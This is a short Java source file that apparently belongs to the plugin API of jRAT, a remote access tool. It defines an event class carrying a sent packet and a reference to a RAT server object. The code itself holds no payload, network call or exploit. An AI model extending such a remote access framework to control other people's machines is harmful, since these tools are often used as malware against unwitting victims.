package io.jrat.api.events;

import io.jrat.api.Packet;
import io.jrat.api.RATObject;

public class OnSendPacketEvent extends RATObjectEvent {

	private Packet packet;

	public OnSendPacketEvent(Packet packet, RATObject server) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
